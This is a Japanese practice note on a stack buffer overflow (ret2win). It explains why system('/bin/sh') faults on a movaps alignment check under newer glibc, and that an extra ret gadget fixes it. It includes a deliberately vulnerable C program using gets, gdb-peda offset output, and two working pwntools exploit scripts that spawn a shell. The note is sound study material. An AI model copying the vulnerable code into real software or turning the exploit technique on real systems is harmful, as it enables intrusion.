## 現象
system("/bin/sh")を入れるとここでSEGVするやつ
```
<do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
```
## 対策
- ret → system("/bin/sh")にする
- なぜ大丈夫なのかはよく分からない（分かったら書く）

## 検証
こんなプログラムを用意
```c
//bofu.c
#include <stdio.h>

char vuln()
{
  char buf[64];
  printf("BOF >> ");
  gets(buf);
  puts(buf);
}

int main()
{
  setbuf(stdout, NULL);
  vuln();
}

void system_binsh()
{
  system("/bin/sh");
}
```

コンパイル
```
gcc bofu.c -fno-stack-protector -no-pie
```
exploitを作る。
まず飛び先を調べて、
```
gdb-peda$ disass system_binsh
Dump of assembler code for function system_binsh:
   0x00000000004006a9 <+0>:	push   rbp
   (snip)  
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   (snip)
   0x000000000040067e <+55>:	leave  
   0x000000000040067f <+56>:	ret    
```

returnアドレスまでの字数を調べて、
```
=> 0x40067f <vuln+56>:	ret    
   0x400680 <main>:	push   rbp
   0x400681 <main+1>:	mov    rbp,rsp
   0x400684 <main+4>:	mov    rax,QWORD PTR [rip+0x2009c5]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x40068b <main+11>:	mov    esi,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd28 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdd30 ("AJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdd38 ("AAKAAgAA6AAL")
0024| 0x7fffffffdd40 --> 0x4c414136 ('6AAL')
0032| 0x7fffffffdd48 --> 0x7fffffffde18 --> 0x7fffffffe1b4 ("/home/jt/Downloads/old/practice/x64/bof1/a.out")
0040| 0x7fffffffdd50 --> 0x100008000 
0048| 0x7fffffffdd58 --> 0x400680 (<main>:	push   rbp)
0056| 0x7fffffffdd60 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000040067f in vuln ()
gdb-peda$ patto IAAe
IAAe found at offset: 72
gdb-peda$
```
この場合こう書くはず。
```python
from pwn import *

BINARY = "./a.out"
elf = ELF(BINARY)

win = 0x4006a9

# r = process(BINARY)
r = gdb.debug(BINARY, '''
b*0x40067f
c
''')

r.recvuntil(">>")

payload  = "A" * 72
payload += p64(win)
r.sendline(payload)

r.interactive()
```
すると、通らない。
（手元の環境だと、ubuntu18は通らない。ubuntu16は通る。）
```
=> 0x7f0e944402f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7f0e944402fb <do_system+1099>:	
    call   0x7f0e94430110 <__GI___sigaction>
   0x7f0e94440300 <do_system+1104>:	
    lea    rsi,[rip+0x39e2f9]        # 0x7f0e947de600 <quit>
   0x7f0e94440307 <do_system+1111>:	xor    edx,edx
   0x7f0e94440309 <do_system+1113>:	mov    edi,0x3
[------------------------------------stack-------------------------------------]
0000| 0x7ffcb4ff3148 --> 0x0 
0008| 0x7ffcb4ff3150 --> 0x7f0e945a4e97 (sub    eax,0x622f0063)
0016| 0x7ffcb4ff3158 --> 0x0 
0024| 0x7ffcb4ff3160 --> 0x0 
0032| 0x7ffcb4ff3168 --> 0x7f0e94440360 (<cancel_handler>:	push   rbx)
0040| 0x7ffcb4ff3170 --> 0x7ffcb4ff3164 --> 0x9444036000000000 
0048| 0x7ffcb4ff3178 --> 0x0 
0056| 0x7ffcb4ff3180 --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f0e944402f6 in do_system (line=0x40075c "/bin/sh")
    at ../sysdeps/posix/system.c:125
125	../sysdeps/posix/system.c: No such file or directory.
gdb-peda$ 
```

調べるとヒットするのは以下の記事。
> 绕过ASLR–return2plt
https://www.tiandiwuji.top/posts/32791/

ASLRを回避という話なの？
結局、retを一回噛ましてくださいというお話になっている。
私の経験値が足りないことだけはわかる。

とりあずは、以下のように修正すると動く。
```python
from pwn import *

BINARY = "./a.out"
elf = ELF(BINARY)

win = 0x4006a9
ret = 0x40067f

# r = process(BINARY)
r = gdb.debug(BINARY, '''
b*0x40067f
c
''')

r.recvuntil(">>")

payload  = "A" * 72
payload += p64(ret)
payload += p64(win)
r.sendline(payload)

r.interactive()
```
以上。

heapは挙動が明らかに変わっていているが、こうやって微妙に変わっているのもおもしろい。
しかしながらスタックBOF初心者は無事死ぬ。
がんばって生きよう。

